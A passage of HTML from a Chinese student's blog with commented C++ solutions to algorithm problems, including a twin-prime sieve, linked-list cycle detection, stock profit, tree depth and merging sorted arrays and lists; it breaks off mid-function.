<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long<span class="comment">//为方便使用,将所有的int就是long long[好看又好用](注意:define后面不跟分号)</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e7</span>+<span class="number">1e3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">bool</span> ok[N];<span class="comment">//用来进行筛选的数组</span></span><br><span class="line"><span class="keyword">int</span> prim[N];<span class="comment">//存有所有的质数</span></span><br><span class="line"><span class="keyword">int</span> pos=<span class="number">0</span>;<span class="comment">//代表当前质数的个数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span> &gt;a ;<span class="comment">//存储所有的孪生质数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; N;++i) &#123;<span class="comment">//质数是从2-N</span></span><br><span class="line">        <span class="keyword">if</span>(ok[i] == <span class="number">0</span>)&#123;<span class="comment">//0表示是质数</span></span><br><span class="line">            prim[pos++] = i;<span class="comment">//将该质数加入到prim数组中.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这里是为了将最小质因数为i的其他合数都进行标记</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; pos; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i*prim[j] &gt; N)<span class="comment">//超过范围</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ok[i*prim[j]] = <span class="number">1</span>;<span class="comment">//标记</span></span><br><span class="line">            <span class="keyword">if</span>(i%prim[j] == <span class="number">0</span>)<span class="comment">//如果prim[j]刚好是i的最小质因数,所以其他时候,i不是最小质因数,prim[j]可以代替它,故退出</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//孪生质数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pos; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(prim[i+<span class="number">1</span>] == prim[i]+<span class="number">2</span>)&#123;</span><br><span class="line">            a.push_back(prim[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//计算a^b</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qmod</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(b&amp;<span class="number">1</span>)</span><br><span class="line">            ans = ans*a%mod;</span><br><span class="line">        a = a*a%mod;</span><br><span class="line">        b&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;<span class="comment">//必须要返回int,但是没int了,用siged代替,本质一样</span></span><br><span class="line">    init();<span class="comment">//初始化，计算所有孪生质数</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="keyword">int</span> sum = (upper_bound(a.<span class="built_in">begin</span>(),a.<span class="built_in">end</span>(),n<span class="number">-2</span>) - a.<span class="built_in">begin</span>()) * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = sum % mod * qmod(n*(n<span class="number">-1</span>) % mod,mod<span class="number">-2</span>) % mod;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="F-数字金字塔"><a href="#F-数字金字塔" class="headerlink" title="F 数字金字塔"></a>F 数字金字塔</h2><blockquote>
<p>考试成功做出来了的简单题</p>
<p>规律很好找，主要是大数麻烦，当时用java的BigInteger做出来的，，，</p>
<p>思路巧妙地进行化简以及dp的思路</p>
</blockquote>
<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p><img src="/2021/04/18/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A62021%E5%B1%8A%E6%96%B0%E7%94%9F%E8%B5%9B/image-20210323164718581.png" alt="image-20210323164718581"></p>
<p>最后这步的化简是根据分数的取模得到的</p>
<p><img src="/2021/04/18/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A62021%E5%B1%8A%E6%96%B0%E7%94%9F%E8%B5%9B/image-20210323164754408.png" alt="image-20210323164754408"></p>
<p><code>i层的和 = i-1层的和 + i*(2*i-1)</code></p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e6</span>+<span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">998244353</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">1e6</span>; ++i) &#123;</span><br><span class="line">        a[i] = (a[i<span class="number">-1</span>] + i*(<span class="number">2</span>*i<span class="number">-1</span>))%mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="G-小凡做蛋糕"><a href="#G-小凡做蛋糕" class="headerlink" title="G 小凡做蛋糕"></a>G 小凡做蛋糕</h2>
	
	</div>
  <a type="button" href="/2021/04/18/西南科技大学2021届新生赛/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/18/牛客网-算法篇/" >牛客网-算法篇</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-18  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="NC4判断链表中是否有环"><a href="#NC4判断链表中是否有环" class="headerlink" title="NC4判断链表中是否有环"></a>NC4判断链表中是否有环</h2><blockquote>
<p>这道题学到了很多，尤其是快慢指针的问题，第一次见到，有三种方法，，，，</p>
</blockquote>
<h3 id="解法1-快慢指针"><a href="#解法1-快慢指针" class="headerlink" title="解法1:快慢指针"></a>解法1:快慢指针</h3><blockquote>
<p>貌似是个经典问题，使用快慢指针也是最简单的一种方法。</p>
<p>他的方法就是两个指针同时出发，慢指针一次走一步，快指针一次走两步，如果相遇的话就说明有环，否则说明没有环。</p>
</blockquote>
<h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>)&#123;<span class="comment">//直接返回的情况</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* slow = head;<span class="comment">//慢指针</span></span><br><span class="line">        ListNode* fast = head;<span class="comment">//快指针</span></span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">nullptr</span> &amp;&amp; fast-&gt;next != <span class="literal">nullptr</span>)&#123;<span class="comment">//还可以继续走</span></span><br><span class="line">            slow = slow-&gt;next;<span class="comment">//慢指针走一步</span></span><br><span class="line">            fast = fast-&gt;next-&gt;next;<span class="comment">//快指针走两步</span></span><br><span class="line">            <span class="keyword">if</span>(slow == fast)&#123;<span class="comment">//如果相遇了</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="解法2-存放到集合"><a href="#解法2-存放到集合" class="headerlink" title="解法2:存放到集合"></a>解法2:存放到集合</h3><h4 id="集合set"><a href="#集合set" class="headerlink" title="集合set"></a>集合set</h4><blockquote>
<p>这个方法比较简单，，，就是每次判断集合中是否有了元素，如果有了的话，就有环，如果没有的话，就加入到集合，，，继续判断。。。</p>
</blockquote>
<h5 id="1-是否包含某个元素"><a href="#1-是否包含某个元素" class="headerlink" title="1.是否包含某个元素"></a>1.是否包含某个元素</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>.count(<span class="string">"元素"</span>);</span><br></pre></td></tr></table></figure>

<h5 id="2-添加元素"><a href="#2-添加元素" class="headerlink" title="2.添加元素"></a>2.添加元素</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>.insert(<span class="string">"元素"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;ListNode*&gt; <span class="built_in">set</span>;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">set</span>.count(head))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">set</span>.insert(head);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="解法3-逐个删除"><a href="#解法3-逐个删除" class="headerlink" title="解法3:逐个删除"></a>解法3:逐个删除</h3><blockquote>
<p>这个方法也很有意思，，，，<del>其实和set本质上有些类似，，，我感觉</del></p>
<p>他的方法是一个链表从头开始删除，删除的方法也很有意思，就是让他的next指针指向自己，，，，如果没有换的话，每次删除没有问题，，，如果有环的话，，，会发现想要删除的时候，发现next指针已经指向自己了。。。</p>
</blockquote>
<p>图示：</p>
<p><img src="/2021/04/18/%E7%89%9B%E5%AE%A2%E7%BD%91-%E7%AE%97%E6%B3%95%E7%AF%87/F616B722C8FF288FE7C88E6AF6A22025" alt="图片说明"></p>
<p>在第三的的next想要删除的时候，会发现1的next已经指向自己了，，，就判断出有环，，，</p>
<h4 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next == head)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* nextNode = head-&gt;next;</span><br><span class="line">        head-&gt;next = head;</span><br><span class="line">        <span class="keyword">return</span> hasCycle(nextNode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC7-股票（一次交易）"><a href="#NC7-股票（一次交易）" class="headerlink" title="NC7 股票（一次交易）"></a>NC7 股票（一次交易）</h2><blockquote>
<p>其本质是寻找上界和下界，但下界必须在上界之后。</p>
<p>所以就是最大最小值，但是找到一个最小值后，最大值要初始化，重新寻找这个最小值之后的最大值，这句很有意思。</p>
</blockquote>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param prices int整型vector </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> t_max=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> t_min=prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> profit=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prices.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(t_max &lt; prices[i])&#123;</span><br><span class="line">                t_max = prices[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(t_min &gt; prices[i])&#123;</span><br><span class="line">                t_min = prices[i];</span><br><span class="line">                t_max=<span class="number">-1</span>;<span class="comment">//确保t_max是再t_min之后</span></span><br><span class="line">            &#125;</span><br><span class="line">            profit=<span class="built_in">max</span>(profit,t_max-t_min);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC13-二叉树的最大深度"><a href="#NC13-二叉树的最大深度" class="headerlink" title="NC13 二叉树的最大深度"></a>NC13 二叉树的最大深度</h2><blockquote>
<p>emmm,使用递归方法解决。</p>
<p>1.如果当前root为nullptr了，那么为0层，直接返回</p>
<p>2.否则的话，分别从左节点和右节点深入下去，且层数加1</p>
<p>其实是个非常简单的递归</p>
</blockquote>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *	int val;</span></span><br><span class="line"><span class="comment"> *	struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *	struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param root TreeNode类 </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(maxDepth(root-&gt;left),maxDepth(root-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC19-子数组的最大累加和的问题"><a href="#NC19-子数组的最大累加和的问题" class="headerlink" title="NC19 子数组的最大累加和的问题"></a>NC19 子数组的最大累加和的问题</h2><blockquote>
<p>求数组的最大累计和。。。</p>
<p>方法是动态规划。有点迷，只意会了，</p>
<p><img src="/2021/04/18/%E7%89%9B%E5%AE%A2%E7%BD%91-%E7%AE%97%E6%B3%95%E7%AF%87/image-20210414203852286.png" alt="image-20210414203852286"></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * max sum of the subarray</span></span><br><span class="line"><span class="comment">     * @param arr int整型vector the array</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxsumofSubarray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr.<span class="built_in">size</span>()==<span class="number">1</span>) <span class="keyword">return</span> arr[<span class="number">0</span>];<span class="comment">//确定的情况，直接返回结果</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;arr.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            arr[i]=<span class="built_in">max</span>(arr[i],arr[i<span class="number">-1</span>]+arr[i]);<span class="comment">//求第i位的最大值</span></span><br><span class="line">            ans=<span class="built_in">max</span>(ans,arr[i]);<span class="comment">//求累计最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC22-合并两个有序的数组"><a href="#NC22-合并两个有序的数组" class="headerlink" title="NC22 合并两个有序的数组"></a>NC22 合并两个有序的数组</h2><blockquote>
<p>将b数组合并到a中，，，其实很简单，但是这个代码非常简介，，，<strong>使用–</strong></p>
</blockquote>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> m, <span class="keyword">int</span> B[], <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i=m<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> j=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> index = m+n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span>)</span><br><span class="line">            A[index--]=A[i]&gt;B[j]?A[i--]:B[j--];</span><br><span class="line">        <span class="keyword">while</span>(j&gt;=<span class="number">0</span>)</span><br><span class="line">            A[index--]=B[j--];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC33-合并有序链表"><a href="#NC33-合并有序链表" class="headerlink" title="NC33 合并有序链表"></a>NC33 合并有序链表</h2><blockquote>
<p>一个重点是，，，一开始res必须初始化，否则别的添加不进来。</p>
<p><strong>还有注意直接返回的简单情况，，，做优化</strong></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *	int val;</span></span><br><span class="line"><span class="comment"> *	struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param l1 ListNode类 </span></span><br><span class="line"><span class="comment">     * @param l2 ListNode类 </span></span><br><span class="line"><span class="comment">     * @return ListNode类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(l1==<span class="literal">nullptr</span>) <span class="keyword">return</span> l2;</span><br><span class="line">        <span class="keyword">if</span>(l2==<span class="literal">nullptr</span>) <span class="keyword">return</span> l1;</span><br><span class="line">       